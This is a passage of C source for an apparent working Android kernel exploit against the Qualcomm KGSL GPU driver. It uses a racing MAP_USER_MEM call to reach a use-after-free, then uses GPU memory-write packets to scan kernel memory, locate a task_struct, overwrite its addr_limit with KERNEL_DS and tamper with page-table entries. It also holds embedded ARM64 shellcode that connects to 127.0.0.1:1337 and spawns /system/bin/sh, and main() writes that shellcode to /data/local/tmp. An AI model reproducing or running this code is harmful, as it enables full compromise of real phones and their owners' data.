                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &verify_cmd) != 0 ||
                        wait_timestamp(fd, ctx_id, verify_cmd.timestamp) != 0) {
                        fprintf(stderr,
                                "        [!] GPU verify(low) failed\n");
                    } else {
                        msync(dst_vma, dst_alloc.mmapsize,
                              MS_SYNC | MS_INVALIDATE);
                    }

                    memset(ib_vma, 0, ib_alloc.mmapsize);
                    dw = 0;
                    vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                    split64(dst_gpu + 4, &d_lo, &d_hi);
                    split64(target_addr + 4, &s_lo, &s_hi);
                    vcmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
                    vcmd[dw++] = 0x00000000;
                    vcmd[dw++] = d_lo;
                    vcmd[dw++] = d_hi;
                    vcmd[dw++] = s_lo;
                    vcmd[dw++] = s_hi;
                    vcmd[dw++] = cp_type7_packet(CP_NOP, 0);

                    verify_ib_bytes = (size_t)dw * 4;
                    msync(ib_vma, verify_ib_bytes, MS_SYNC);

                    verify_obj.gpuaddr = ib_gpu;
                    verify_obj.size    = verify_ib_bytes;
                    verify_obj.id      = ib_id;

                    memset(&verify_cmd, 0, sizeof(verify_cmd));
                    verify_cmd.cmdlist    = (uint64_t)(uintptr_t)&verify_obj;
                    verify_cmd.cmdsize    = sizeof(verify_obj);
                    verify_cmd.numcmds    = 1;
                    verify_cmd.context_id = ctx_id;

                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &verify_cmd) != 0 ||
                        wait_timestamp(fd, ctx_id, verify_cmd.timestamp) != 0) {
                        fprintf(stderr,
                                "        [!] GPU verify(high) failed\n");
                    } else {
                        msync(dst_vma, dst_alloc.mmapsize,
                              MS_SYNC | MS_INVALIDATE);
                    }

                    uint32_t *vdata = (uint32_t *)dst_vma;
                    fprintf(stderr,
                            "        [*] Verify: %08X %08X\n",
                            vdata[0], vdata[1]);
                    if (vdata[0] == kds_lo && vdata[1] == kds_hi) {
                        fprintf(stderr,
                                "        [+++] addr_limit KERNEL_DS confirmed\n");
                        *(uint32_t *)&gbuf[CUR_PID]=comm_pid;
                        int scc=0;
                        if (comm_pid >0 && spray_ctrl != NULL){
                            for (int si=0; si<spray_count;si++){
                                if (spray_ctrl[si].pid == comm_pid){
                                    fprintf(stderr," [*] Trigger spary slot %d (pid=%d)\n",si,spray_ctrl[si].pid);
                                    spray_ctrl[si].do_action=1;
                                    *(uint64_t *)&gbuf[TARGET_PIDPID] = spray_ctrl[si].pid;
                                    scc=1;

                                }
                            }
                        }
                        if (scc==0){
                            fprintf(stderr,"[!!] Something wrong!! no do_action. not Spray\n");
                            exit(1);
                        }
                    } else {
                        fprintf(stderr,
                                "        [!!!] addr_limit patch mismatch: read 0x%08X%08X expected 0x%08X%08X at VA 0x%llx (off 0x%03x)\n",
                                vdata[1], vdata[0],
                                kds_hi, kds_lo,
                                (unsigned long long)target_addr,
                                userds_off);
                        /* Retry once */
                        memset(ib_vma, 0, ib_alloc.mmapsize);
                        dw = 0;
                        wcmd = (uint32_t *)ib_vma;
                        for (int i = 0; i < 4; i++)
                            wcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                        split64(target_addr, &t_lo, &t_hi);
                        wcmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
                        wcmd[dw++] = t_lo;
                        wcmd[dw++] = t_hi;
                        wcmd[dw++] = kds_lo;
                        split64(target_addr + 4, &t_lo, &t_hi);
                        wcmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
                        wcmd[dw++] = t_lo;
                        wcmd[dw++] = t_hi;
                        wcmd[dw++] = kds_hi;
                        for (int i = 0; i < 4; i++)
                            wcmd[dw++] = cp_type7_packet(CP_NOP, 0);

                        patch_ib_bytes = (size_t)dw * 4;
                        msync(ib_vma, patch_ib_bytes, MS_SYNC);
                        patch_obj.gpuaddr = ib_gpu;
                        patch_obj.size    = patch_ib_bytes;
                        patch_obj.id      = ib_id;
                        memset(&patch_cmd, 0, sizeof(patch_cmd));
                        patch_cmd.cmdlist    = (uint64_t)(uintptr_t)&patch_obj;
                        patch_cmd.cmdsize    = sizeof(patch_obj);
                        patch_cmd.numcmds    = 1;
                        patch_cmd.context_id = ctx_id;

                        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &patch_cmd) == 0 &&
                            wait_timestamp(fd, ctx_id, patch_cmd.timestamp) == 0) {
                            /* Re-verify after retry */
                            memset(dst_vma, 0, dst_alloc.mmapsize);
                            memset(ib_vma, 0, ib_alloc.mmapsize);
                            dw = 0;
                            vcmd = (uint32_t *)ib_vma;
                            vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                            split64(dst_gpu, &d_lo, &d_hi);
                            split64(target_addr, &s_lo, &s_hi);
                            vcmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
                            vcmd[dw++] = 0;
                            vcmd[dw++] = d_lo;
                            vcmd[dw++] = d_hi;
                            vcmd[dw++] = s_lo;
                            vcmd[dw++] = s_hi;
                            vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                            verify_ib_bytes = (size_t)dw * 4;
                            msync(ib_vma, verify_ib_bytes, MS_SYNC);
                            verify_obj.gpuaddr = ib_gpu;
                            verify_obj.size    = verify_ib_bytes;
                            verify_obj.id      = ib_id;
                            memset(&verify_cmd, 0, sizeof(verify_cmd));
                            verify_cmd.cmdlist    = (uint64_t)(uintptr_t)&verify_obj;
                            verify_cmd.cmdsize    = sizeof(verify_obj);
                            verify_cmd.numcmds    = 1;
                            verify_cmd.context_id = ctx_id;
                            if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &verify_cmd) == 0 &&
                                wait_timestamp(fd, ctx_id, verify_cmd.timestamp) == 0) {
                                msync(dst_vma, dst_alloc.mmapsize,
                                      MS_SYNC | MS_INVALIDATE);
                            }
                            /* high dword */
                            memset(ib_vma, 0, ib_alloc.mmapsize);
                            dw = 0;
                            vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                            split64(dst_gpu + 4, &d_lo, &d_hi);
                            split64(target_addr + 4, &s_lo, &s_hi);
                            vcmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
                            vcmd[dw++] = 0;
                            vcmd[dw++] = d_lo;
                            vcmd[dw++] = d_hi;
                            vcmd[dw++] = s_lo;
                            vcmd[dw++] = s_hi;
                            vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
                            verify_ib_bytes = (size_t)dw * 4;
                            msync(ib_vma, verify_ib_bytes, MS_SYNC);
                            verify_obj.gpuaddr = ib_gpu;
                            verify_obj.size    = verify_ib_bytes;
                            verify_obj.id      = ib_id;
                            memset(&verify_cmd, 0, sizeof(verify_cmd));
                            verify_cmd.cmdlist    = (uint64_t)(uintptr_t)&verify_obj;
                            verify_cmd.cmdsize    = sizeof(verify_obj);
                            verify_cmd.numcmds    = 1;
                            verify_cmd.context_id = ctx_id;
                            if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &verify_cmd) == 0 &&
                                wait_timestamp(fd, ctx_id, verify_cmd.timestamp) == 0) {
                                msync(dst_vma, dst_alloc.mmapsize,
                                      MS_SYNC | MS_INVALIDATE);
                            }

                            vdata = (uint32_t *)dst_vma;
                            fprintf(stderr,
                                    "        [*] Retry verify: %08X %08X\n",
                                    vdata[0], vdata[1]);
                            if (vdata[0] == kds_lo && vdata[1] == kds_hi) {
                                fprintf(stderr,
                                        "        [+++] addr_limit KERNEL_DS confirmed after retry\n");
                                *(uint32_t *)&gbuf[CUR_PID]=comm_pid;
                                if (comm_pid >0 && spray_ctrl != NULL){
                                    for (int si=0; si<spray_count;si++){
                                        if (spray_ctrl[si].pid == comm_pid){
                                            fprintf(stderr," [*] Trigger spary slot %d (pid=%d)\n",si,spray_ctrl[si].pid);

                                        }
                                    }
                                }
                            } else {
                                fprintf(stderr,
                                        "        [!!!] addr_limit patch still mismatched after retry: read 0x%08X%08X\n",
                                        vdata[1], vdata[0]);
                            }
                        }
                    }
                }
                fflush(stderr);
            }

            if (only_once == 1) {
                if (non_zero_pages < FINDING) {
                    found_pages[non_zero_pages].va             = current_va;
                    found_pages[non_zero_pages].non_zero_count = non_zero;
                    memcpy(found_pages[non_zero_pages].data, data, 4096);
                }
                non_zero_pages = 1;
                fprintf(stderr,
                        "      [*] task_struct confirmed, stopping scan\n");
                fflush(stderr);
                found = 1;
                break;
            }
        }

        current_va += PAGE_SIZE;
    }

    fprintf(stderr, "\n    [*] Scan complete:\n");
    fprintf(stderr, "        Pages scanned: %d\n",   pages_scanned);
    fprintf(stderr, "        Pages : %d\n",
            non_zero_pages);
    fflush(stderr);

    if (only_once != 1) {
        fprintf(stderr,
                "    [!] only_once != 1 (task_struct not confirmed). Treating as failure.\n");
        fflush(stderr);
    }

    *num_found = non_zero_pages;
    found      = (only_once == 1);

cleanup:
    if (dst_vma && dst_vma != MAP_FAILED) munmap(dst_vma, dst_alloc.mmapsize);
    if (ib_vma  && ib_vma  != MAP_FAILED) munmap(ib_vma,  ib_alloc.mmapsize);

    if (dst_id) { struct kgsl_gpuobj_free fr = {0}; fr.id = dst_id; ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }
    if (ib_id)  { struct kgsl_gpuobj_free fr = {0}; fr.id = ib_id;  ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr); }


    return found;
}


/* Analyze found pages  */
static void analyze_found_pages(struct nonzero_page *pages, int num_pages)
{
    fprintf(stderr, "\n[+] Analyzing %d pages for patterns\n", num_pages);
    fprintf(stderr, "========================================\n");
    fflush(stderr);

    uint64_t kernel_ds = (uint64_t)KERNEL_DS;      
    uint64_t user_ds   = (uint64_t)USER_DS;        

    uint32_t kds_lo = (uint32_t)(kernel_ds & 0xffffffffu);
    uint32_t kds_hi = (uint32_t)(kernel_ds >> 32);

    uint32_t uds_lo = (uint32_t)(user_ds & 0xffffffffu);
    uint32_t uds_hi = (uint32_t)(user_ds >> 32);

    for (int p = 0; p < num_pages; p++) {
        fprintf(stderr, "\n[Page %d] VA 0x%llx, non-zero: %d/1024\n",
                p + 1,
                (unsigned long long)pages[p].va,
                pages[p].non_zero_count);

        uint32_t *data  = pages[p].data;
        uint8_t  *bytes = (uint8_t *)data;

        int comm_found  = 0;
        int comm_offset = -1;
        for (int offset = 0; offset < 4096 - 16; offset++) {
            if (memcmp(bytes + offset, "KETO0422", 8) == 0) {
                fprintf(stderr, "  [+] Found KETO0422 at offset 0x%03x\n", offset);
                fprintf(stderr, "      Comm: %.16s\n", bytes + offset);
                comm_found  = 1;
                comm_offset = offset;

                int cred_off = offset - 0x9C;
                if (cred_off >= 0 && cred_off < 4000) {
                    uint64_t cred = *(uint64_t *)(bytes + cred_off);
                    if ((cred & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
                        fprintf(stderr,
                                "      Cred at 0x%03x: 0x%016llx\n",
                                cred_off, (unsigned long long)cred);
                        fprintf(stderr, "  [+++] CONFIRMED task_struct!\n");
                    }
                }
                break;
            }
        }

        fprintf(stderr, "\n  [*] Searching for FFFFFFC0 patterns:\n");
        int ffffffc0_count = 0;

        for (int i = 0; i < 1024; i++) {
            if ((data[i] & 0xFFFFFFF0) == 0xFFFFFFC0) {
                if (ffffffc0_count == 0) {
                    fprintf(stderr, "      Found FFFFFFC0 patterns at:\n");
                }

                if (ffffffc0_count < 10) {
                    fprintf(stderr, "        [0x%03x] %08X", i * 4, data[i]);

                    if (i > 0) {
                        uint64_t ptr = ((uint64_t)data[i] << 32) | data[i - 1];
                        fprintf(stderr, " (64-bit: 0x%016llx)",
                                (unsigned long long)ptr);
                    }
                    fprintf(stderr, "\n");
                }

                ffffffc0_count++;
            }
        }

        if (ffffffc0_count > 0) {
            fprintf(stderr, "      Total: %d FFFFFFC0 patterns\n", ffffffc0_count);
        } else {
            fprintf(stderr, "      No FFFFFFC0 patterns found\n");
        }

        fprintf(stderr,
                "\n  [*] Searching for USER_DS (0x%08X%08X):\n",
                uds_hi, uds_lo);
        int user_ds_found = 0;

        for (int i = 0; i < 1023; i++) {
            if (data[i] == uds_lo && data[i + 1] == uds_hi) {
                uint64_t val = ((uint64_t)uds_hi << 32) | uds_lo;
                fprintf(stderr,
                        "      [+] Found USER_DS at offset 0x%03x\n", i * 4);
                fprintf(stderr,
                        "          [0x%03x] %08X %08X\n",
                        i * 4, data[i], data[i + 1]);
                fprintf(stderr,
                        "          Value: 0x%016llx\n",
                        (unsigned long long)val);
                user_ds_found = 1;
            }
        }

        if (!user_ds_found) {
            fprintf(stderr, "      No USER_DS pattern found\n");
        }

        if (comm_found) {
            fprintf(stderr,
                    "\n  [*] Checking thread_struct area (0xf00-0xf80) for addr_limit:\n");
            int kds_pairs = 0;

            for (int off = 0xf00; off < 0xf80; off += 8) {
                int idx = off / 4;
                if (idx + 1 < 1024) {
                    if (data[idx] == kds_lo && data[idx + 1] == kds_hi) {
                        fprintf(stderr,
                                "      [0x%03x] %08X %08X (KERNEL_DS)\n",
                                off, data[idx], data[idx + 1]);
                        kds_pairs++;
                    }
                }
            }

            fprintf(stderr,
                    "      Found %d KERNEL_DS pairs in thread area\n",
                    kds_pairs);
        }

        /* 5. Dump thread_struct area (0xf00-0xf80) if comm found */
        if (comm_found) {
            fprintf(stderr, "\n  [*] Thread_struct area dump (0xf00-0xf80):\n");
            for (int off = 0xf00; off < 0xf80; off += 0x20) {
                int idx = off / 4;
                fprintf(stderr, "      [0x%03x]", off);
                for (int j = 0; j < 8 && (idx + j) < 1024; j++) {
                    fprintf(stderr, " %08X", data[idx + j]);
                }
                fprintf(stderr, "\n");
            }
        }

        fprintf(stderr, "\n");
        fflush(stderr);
    }

    fprintf(stderr, "========================================\n");
    fflush(stderr);
}


static int scan_uaf_and_collect(int fd,
				struct nonzero_page *pages,
				int *num_pages)
{
	unsigned ctx_id = 0, ib_id = 0, dst_id = 0;
	uint64_t ib_gpu = 0, dst_gpu = 0;
	void *ib_vma = NULL, *dst_vma = NULL;
	int found = 0;

	*num_pages = 0;

	fprintf(stderr, "\n[+] Scanning UAF region for non-zero pages\n");
	fprintf(stderr, "    Region: 0x%llx ~ 0x%llx\n",
		(unsigned long long)UAF_START,
		(unsigned long long)(UAF_START + UAF_SIZE));

	struct kgsl_drawctxt_create ctx = {
		.flags = 0x00000010 | 0x00000002 /* PREAMBLE | NO_GMEM_ALLOC */
	};
	if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) {
		fprintf(stderr, "    [!] Failed to create GPU context\n");
		return 0;
	}
	ctx_id = ctx.drawctxt_id;

	struct kgsl_gpuobj_alloc ib_alloc = {
		.size  = PAGE_SIZE * 8,
		.flags = KGSL_MEMFLAGS_USE_CPU_MAP
	};
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
		exit(1);

	ib_id = ib_alloc.id;
	ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
		      MAP_SHARED, fd, ((off_t)ib_id) << 12);
	if (ib_vma == MAP_FAILED)
		exit(1);

	struct kgsl_gpuobj_info info = { .id = ib_id };
	ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
	ib_gpu = info.gpuaddr;

	struct kgsl_gpuobj_alloc dst_alloc = {
		.size  = PAGE_SIZE,
		.flags = KGSL_MEMFLAGS_USE_CPU_MAP
	};
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0)
		exit(1);

	dst_id = dst_alloc.id;
	dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
		       MAP_SHARED, fd, ((off_t)dst_id) << 12);
	if (dst_vma == MAP_FAILED)
		exit(1);

	info.id = dst_id;
	ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
	dst_gpu = info.gpuaddr;

	fprintf(stderr, "    [+] IB GPU=0x%llx, DST GPU=0x%llx\n",
		(unsigned long long)ib_gpu, (unsigned long long)dst_gpu);
	fprintf(stderr, "    [*] Scanning... (. = 100 pages)\n");

	uint64_t start_va   = UAF_START ;
	uint64_t end_va     = UAF_START + UAF_SIZE;
	uint64_t current_va = start_va;
	int pages_scanned   = 0;
	uint32_t *rb_count  = (uint32_t *)(gbuf + 0xb00);

	while (current_va < end_va && *rb_count < MAX_FOUND_PAGES) {
		uint32_t *cmd = (uint32_t *)ib_vma;
		memset(ib_vma, 0, ib_alloc.mmapsize);
		memset(dst_vma, 0, dst_alloc.mmapsize);
		int dw = 0;

		cmd[dw++] = cp_type7_packet(CP_NOP, 0);

		for (int i = 0; i < 1024; i++) {
			uint32_t d_lo, d_hi, s_lo, s_hi;
			split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
			split64(current_va + (uint64_t)i * 4, &s_lo, &s_hi);

			cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
			cmd[dw++] = 0;
			cmd[dw++] = d_lo;
			cmd[dw++] = d_hi;
			cmd[dw++] = s_lo;
			cmd[dw++] = s_hi;
		}

		cmd[dw++] = cp_type7_packet(CP_NOP, 0);

		size_t ib_bytes = (size_t)dw * 4;
		msync(ib_vma, ib_bytes, MS_SYNC);

		struct kgsl_command_object cmd_obj = {
			.gpuaddr = ib_gpu,
			.size    = ib_bytes,
			.flags   = 0x1,
			.id      = ib_id
		};

		struct kgsl_gpu_command gpu_cmd = {0};
		gpu_cmd.cmdlist    = (uint64_t)(uintptr_t)&cmd_obj;
		gpu_cmd.cmdsize    = sizeof(cmd_obj);
		gpu_cmd.numcmds    = 1;
		gpu_cmd.context_id = ctx_id;

		if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0)
			break;
		if (wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) != 0)
			break;

		msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);

		uint32_t *data = (uint32_t *)dst_vma;
		int non_zero = 0;
		for (int i = 0; i < 1024; i++) {
			if (data[i] != 0)
				non_zero++;
		}

		pages_scanned++;
		if (pages_scanned % 100 == 0) {
			fprintf(stderr, ".");
			fflush(stderr);
		}   

		if (non_zero == 10) {
            fprintf(stderr,"non_zero == 10\n");
			if (non_zero == 10 &&
			    data[2] && data[3] && data[6] && data[7] && data[10] && data[11] && data[14] && data[15] && data[18] && data[19] ) {
				const uint32_t f53_mask = 0xFFF;
				const uint32_t f53_tag  = 0xF53;
				if (((data[2] & f53_mask) == f53_tag) &&
				    ((data[6] & f53_mask) == f53_tag)) {
                    fprintf(stderr, "vic_pte %x %x",data[2],data[3]);
					memset(ib_vma, 0, ib_alloc.mmapsize);
					int wdw = 0;
					uint32_t *wcmd = (uint32_t *)ib_vma;

					for (int i = 0; i < 4; i++)
						wcmd[wdw++] = cp_type7_packet(CP_NOP, 0);

					uint32_t t_lo, t_hi;

					split64(current_va+8, &t_lo, &t_hi);
					wcmd[wdw++] = cp_type7_packet(CP_MEM_WRITE, 3);
					wcmd[wdw++] = t_lo;
					wcmd[wdw++] = t_hi;
					wcmd[wdw++] = data[6];

					split64(current_va + 12, &t_lo, &t_hi);
					wcmd[wdw++] = cp_type7_packet(CP_MEM_WRITE, 3);
					wcmd[wdw++] = t_lo;
					wcmd[wdw++] = t_hi;
					wcmd[wdw++] = data[7];

					for (int i = 0; i < 4; i++)
						wcmd[wdw++] = cp_type7_packet(CP_NOP, 0);

					if (*rb_count < MAX_FOUND_PAGES) {
						uint8_t *slot = (uint8_t *)(gbuf + 0xb08 + (*rb_count) * 24);
						*(uint64_t *)slot = current_va;
                        fprintf(stderr,
                                "cur_VA : %llx\n",
                                (unsigned long long)*(uint64_t *)slot);
						uint32_t *slot_dw = (uint32_t *)(slot + 8); //b10
						slot_dw[0] = data[2]; //b10
						slot_dw[1] = data[3]; //b14
						slot_dw[2] = data[6]; //b18
						slot_dw[3] = data[7]; //b1c
						uint64_t *save_pte0 = (uint64_t *)(gbuf + PTE_SAVE_BASE + (*rb_count) * 8);
						*save_pte0 = ((uint64_t)data[3] << 32) | data[2];
						(*rb_count)++;
					}


					size_t patch_ib_bytes = (size_t)wdw * 4;
					msync(ib_vma, patch_ib_bytes, MS_SYNC);

					struct kgsl_command_object patch_obj = {
						.gpuaddr = ib_gpu,
						.size    = patch_ib_bytes,
						.flags   = KGSL_CMDLIST_IB,
						.id      = ib_id
					};

					struct kgsl_gpu_command patch_cmd = {0};
					patch_cmd.cmdlist    = (uint64_t)(uintptr_t)&patch_obj;
					patch_cmd.cmdsize    = sizeof(patch_obj);
					patch_cmd.numcmds    = 1;
					patch_cmd.context_id = ctx_id;

					if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &patch_cmd) == 0 &&
					    wait_timestamp(fd, ctx_id, patch_cmd.timestamp) == 0) {
						fprintf(stderr,
							"      [*] CP_MEM_WRITE: mirrored PTE 0x8 -> 0x0 on VA 0x%llx (F53 suffix)\n",
							(unsigned long long)current_va);
					} else {
						fprintf(stderr,
							"      [!] CP_MEM_WRITE failed while mirroring PTE on VA 0x%llx\n",
							(unsigned long long)current_va);
					}
				} else {
					fprintf(stderr,
						"      [!] Skipping CP_MEM_WRITE: PTE low dword does not end with 0xF53\n");
				}
			}

			if (*num_pages < MAX_FOUND_PAGES) {
				struct nonzero_page *p = &pages[*num_pages];
				p->va = current_va;
				p->non_zero_count = non_zero;
				memcpy(p->data, data, sizeof(p->data));
				(*num_pages)++;
			}

			fprintf(stderr,
				"\n\n    [!] Found page with == 10 non-zero dwords @ VA 0x%llx (%d/1024)\n",
				(unsigned long long)current_va, non_zero);
		}

		current_va += PAGE_SIZE;
	}

	fprintf(stderr, "\n\n    [*] Scan done: scanned %d pages, collected %d pages\n",
		pages_scanned, *num_pages);
	found = *num_pages > 0;

cleanup:
    usleep(1000000);
	if (dst_id) {
		struct kgsl_gpuobj_free fr = {0};
		fr.id = dst_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
	}
	if (ib_id) {
		struct kgsl_gpuobj_free fr = {0};
		fr.id = ib_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
	}
	if (dst_vma && dst_vma != MAP_FAILED)
		munmap(dst_vma, dst_alloc.mmapsize);

	if (ib_vma && ib_vma != MAP_FAILED)
		munmap(ib_vma, ib_alloc.mmapsize);

	return found;
}

static void dump_nonzero_pages(struct nonzero_page *pages, int num_pages)
{
    fprintf(stderr, "\n[+] Dumping %d non-zero pages\n\n", num_pages);
    fflush(stderr);
    
    for (int p = 0; p < num_pages; p++) {
        fprintf(stderr, "========================================\n");
        fprintf(stderr, "Page %d: VA 0x%llx (%d non-zero dwords)\n",
                p + 1,
                (unsigned long long)pages[p].va,
                pages[p].non_zero_count);
        fprintf(stderr, "========================================\n");
        
        for (int i = 0; i < 1024; i++) {
            if (i % 8 == 0) {
                fprintf(stderr, "[0x%03x] ", i * 4);
            }
            
            fprintf(stderr, "%08X ", pages[p].data[i]);
            
            if (i % 8 == 7) {
                fprintf(stderr, "\n");
            }
        }
        
        fprintf(stderr, "\n");
        fflush(stderr);
    }
    
    analyze_found_pages(pages, num_pages);
}













static void *mmap_gpuobj_fixed(int fd, unsigned int id, uint64_t mmapsize, 
                                void *fixed_addr)
{
    off_t offset = ((off_t)id) << 12;
    size_t len = mmapsize;
    void *p = mmap(fixed_addr, len, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd, offset);
    return p;
}

static void *bogus_racer(void *arg)
{
    race_state_t *rs = (race_state_t *)arg;
    
    while (!rs->ready) {
        __asm__ __volatile__("" ::: "memory");
    }
    
    rs->bogus_started = 1;
    __sync_synchronize();
    
    struct kgsl_map_user_mem req = {0};
    req.fd = -1;
    req.gpuaddr = 0;
    req.len = WRAP_SIZE;                      // Wraps around!
    req.offset = 0;
    req.hostptr = BOGUS_START;
    req.memtype = KGSL_USER_MEM_TYPE_ADDR;   
    req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    
    int ret = ioctl(rs->fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    int err = errno;
    
    rs->result = ret;
    rs->saved_errno = err;
    __sync_synchronize();
    
    return NULL;
}

char shellcode[287] = {0xff, 0x03, 0x03, 0xd1, 0xfd, 0x7b, 0x06, 0xa9, 0xfc, 0x6f, 0x07, 0xa9, 0xfa, 0x67, 0x08, 0xa9, 0xf8, 0x5f, 0x09, 0xa9, 0xf6, 0x57, 0x0a, 0xa9, 0xf4, 0x4f, 0x0b, 0xa9, 0xc8, 0x15, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0x1f, 0x00, 0x00, 0xf1, 0x01, 0x06, 0x00, 0x54, 0x00, 0x24, 0xa0, 0xf2, 0x01, 0x00, 0x80, 0xd2, 0x02, 0x00, 0x80, 0xd2, 0x03, 0x00, 0x80, 0xd2, 0x88, 0x1b, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0x1f, 0x00, 0x00, 0xf1, 0x01, 0x05, 0x00, 0x54, 0x40, 0x00, 0x80, 0xd2, 0x21, 0x00, 0x80, 0xd2, 0x02, 0x00, 0x80, 0xd2, 0xc8, 0x18, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xf3, 0x03, 0x00, 0xaa, 0xe0, 0x03, 0x13, 0xaa, 0x01, 0x05, 0x00, 0x10, 0x02, 0x02, 0x80, 0xd2, 0x68, 0x19, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xe0, 0x03, 0x13, 0xaa, 0x01, 0x00, 0x80, 0xd2, 0xe2, 0x03, 0x1f, 0xaa, 0x08, 0x03, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xe0, 0x03, 0x13, 0xaa, 0x21, 0x00, 0x80, 0xd2, 0xe2, 0x03, 0x1f, 0xaa, 0x08, 0x03, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xe0, 0x03, 0x13, 0xaa, 0x41, 0x00, 0x80, 0xd2, 0xe2, 0x03, 0x1f, 0xaa, 0x08, 0x03, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xe0, 0x02, 0x00, 0x10, 0xf5, 0x03, 0x00, 0xaa, 0x16, 0x00, 0x80, 0xd2, 0xf5, 0x03, 0x00, 0xf9, 0xf6, 0x07, 0x00, 0xf9, 0xe1, 0x03, 0x00, 0x91, 0x02, 0x00, 0x80, 0xd2, 0xa8, 0x1b, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0x00, 0x00, 0x80, 0xd2, 0x01, 0x00, 0x80, 0xd2, 0xc8, 0x0b, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xf4, 0x4f, 0x4b, 0xa9, 0xf6, 0x57, 0x4a, 0xa9, 0xf8, 0x5f, 0x49, 0xa9, 0xfa, 0x67, 0x48, 0xa9, 0xfc, 0x6f, 0x47, 0xa9, 0xfd, 0x7b, 0x46, 0xa9, 0xff, 0x03, 0x03, 0x91, 0xc0, 0x03, 0x5f, 0xd6, 0x02, 0x00, 0x05, 0x39, 0x7f, 0x00, 0x00, 0x01, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00}; 
int main(int argc, char **argv)
{   gbuf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
            MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (gbuf == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
    fprintf(stderr, "main  pid = %d, main ppid=%d\n", getpid(),getppid());
    gbuf[0x888]=0;
    int pid = fork();
    if (!pid) {
        fprintf(stderr,"child1\n");
        int pid2 = fork();
        if (!pid2){
            while(1){
                if(gbuf[FOUND_PID]==0x12){
                    sleep(2);
                    gbuf[CALL_LOGLINE]=0x11;
                    fprintf(stderr, "child 2 pid = %d, child2 ppid=%d\n", getpid(),getppid());
                    //__builtin_trap();
                    return 0;
                }
                usleep(100000);
                
            }
        }
        else{
            //__builtin_trap();
            while(1){
                if(gbuf[FOUND_PID]==0x11){
                    fprintf(stderr, "child 1 pid = %d, child1 ppid=%d\n", getpid(),getppid());
                    gbuf[FOUND_PID]=0x12;
                    _exit(1);
                }
                sleep(1);
            } 
        }
        
    }
    

    fd_shellcode=open("/data/local/tmp/shellcode", O_RDWR | O_CREAT | O_TRUNC,0777);
    write(fd_shellcode,shellcode,287);
    
    char * path = "/system/lib64/libbase.so";
    fd_lib=open(path,O_RDONLY);
    if (fd_lib<0) perror("open");
    
    if (fstat(fd_lib, &st) < 0) { close(fd_lib); return 0; }



    spray_ctrl = mmap(NULL,
                  sizeof(spray_slot_t) * SPRAY_COUNT_MAX,
                  PROT_READ | PROT_WRITE,
                  MAP_SHARED | MAP_ANONYMOUS,
                  -1, 0);
    if (spray_ctrl == MAP_FAILED) {
        perror("mmap spray_ctrl");
        exit(1);
    }
    memset(spray_ctrl, 0, sizeof(spray_slot_t) * SPRAY_COUNT_MAX);
    


restart: ;
    unsigned int uaf_id = 0, overlap_id = 0, ph_id = 0;
    uint64_t uaf_mmapsize = 0, overlap_mmapsize = 0, ph_mmapsize = 0;
    void *uaf_vma = NULL, *bogus_vma = NULL, *ph_vma = NULL, *overlap_vma = NULL;
    int success = 0;
    int retries = 20;
    uaf_id = overlap_id = ph_id = 0;
    uaf_mmapsize = overlap_mmapsize = ph_mmapsize = 0;
    uaf_vma = bogus_vma = ph_vma = overlap_vma = NULL;
    success = 0;
    
    fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
    if (fd < 0) {
        perror("open /dev/kgsl-3d0");
        return 1;
    }
    
